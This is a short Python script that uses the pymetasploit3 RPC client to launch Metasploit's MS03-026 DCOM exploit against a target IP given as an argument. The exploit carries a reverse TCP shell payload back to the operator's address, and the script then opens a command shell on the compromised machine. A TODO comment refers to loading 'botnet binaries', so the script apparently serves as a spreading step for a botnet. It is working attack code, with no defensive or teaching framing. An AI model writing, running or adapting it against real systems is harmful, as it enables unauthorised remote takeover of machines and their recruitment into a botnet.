from pymetasploit3.msfrpc import MsfRpcClient
import sys

# main.py password ip
if len(sys.argv) < 4:
    print('Usage python3 main.py [password] [LocalIP] [TargetIP]\n')
    print('\t- password: msgrpc service password. See https://github.com/DanMcInerney/pymetasploit3#msfconsole')
    print('\t- LocalIP: Local IP for the reverse shell.')
    print('\t- TargetIP: The target PC.')
    # Exit
    raise SystemExit

print('Loading client...')
client = MsfRpcClient(sys.argv[1], port=55552)
print('Client loaded...')

# Load the exploit
print('Loading script')
exploit = client.modules.use('exploit', 'windows/dcerpc/ms03_026_dcom')
exploit['RHOSTS'] = sys.argv[3]
# Generate the payload
payload = client.modules.use('payload', 'generic/shell_reverse_tcp')
payload['LHOST']  = sys.argv[2]
# Pull up a shell
print('Executing exploit')
exploit.execute(payload=payload)
# Raise shell
if(len(client.sessions.list) == 0 ):
    print('Not sessions found')
    raise SystemExit
shell = client.sessions.session('1')
# TODO: Load binaries from the node js botnet binaries
shell.write('start cmd.exe')
# Opt.
print(shell.read())
# Stop the shell
shell.stop()